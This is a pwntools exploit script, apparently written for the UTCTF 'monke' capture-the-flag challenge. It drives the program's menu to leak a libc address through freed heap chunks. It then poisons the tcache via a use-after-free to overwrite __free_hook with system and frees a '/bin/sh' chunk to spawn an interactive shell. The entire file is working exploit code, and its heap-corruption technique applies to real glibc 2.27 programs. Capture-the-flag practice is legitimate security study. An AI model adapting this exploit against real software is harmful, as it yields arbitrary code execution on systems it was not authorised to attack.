#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './monke'
lib = './libc-2.27.so'
LIBC = None

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    global LIBC
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        if args.REMOTE:
            LIBC = ELF('./remote_libc.so')
            return remote('pwn.utctf.live', 9999)
        LIBC = ELF(lib)
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def walk(direction):
    io.sendlineafter('2: inventory\n', '0')
    io.sendlineafter(']\n', direction)
    return io.recvline()

def inventory(index, action, rename=''):
    log.info('{} at index {}'.format(action, index))
    io.sendline('2')
    io.sendlineafter('\n', str(index))
    io.sendlineafter('Choose an action [eat|rename]:\n', action)
    if action == 'eat':
        return io.recvline()

    io.sendline(rename)
    return io.recvline()

def take_banana(size, name):
    log.info("Taking banana, size: {}".format(size))
    io.sendlineafter('3: take banana\n', '3')
    io.sendlineafter('How long would you like the name to be:\n', str(size))
    if size == 0:
        return
    io.sendlineafter('What would you like to name it:\n', name)

io = start()

NORTH = 'n'
SOUTH = 's'
EAST = 'e'
WEST = 'w'


################################################################################
# LEAK LIBC
################################################################################

result = walk(NORTH)
while b'banana' not in result:
    result = walk(NORTH)

log.success('Got field with banana!')

for i in range(7):
    take_banana(0x100, chr(ord('A')+i)*0x50)

take_banana(0x100, 'a'*0x20)
take_banana(0x100, 'b'*0x20)
take_banana(0x100, 'c'*0x20)

inventory(8, 'eat')
for i in range(7):
    inventory(i, 'eat')

inventory(7, 'eat')
inventory(9, 'eat')

take_banana(0, '')
take_banana(0, '')

io.sendline('2')
io.recvuntil('Pick an item.\n')
result = io.recvline()[3:-1]
leak = u64(result.ljust(8, b'\x00'))
log.success('Got leak!: {}'.format(hex(leak)))
libc_offset = 0x3ebca0
libc_base = leak - libc_offset
LIBC.address = libc_base
log.success('Got libc base addr: {}'.format(hex(libc_base)))
io.sendline('0')
io.sendline('eat')
io.sendline('2')
io.sendline('1')
io.sendline('eat')

################################################################################
# DOUBLE FREE
################################################################################

for i in range(7):
    take_banana(0x100, chr(ord('A')+i)*0x50)

result = walk('h')
while b'banana' not in result:
    result = walk(NORTH)

log.success('Got banana!')

for i in range(7):
    inventory(i, 'eat')

inventory(6, 'rename', rename=p64(LIBC.symbols['__free_hook']))

take_banana(0x100, 'Z'*0x50)
take_banana(0x100, p64(LIBC.sym.system))
take_banana(0x20, '/bin/sh\x00')
inventory(9, 'eat')

io.interactive()
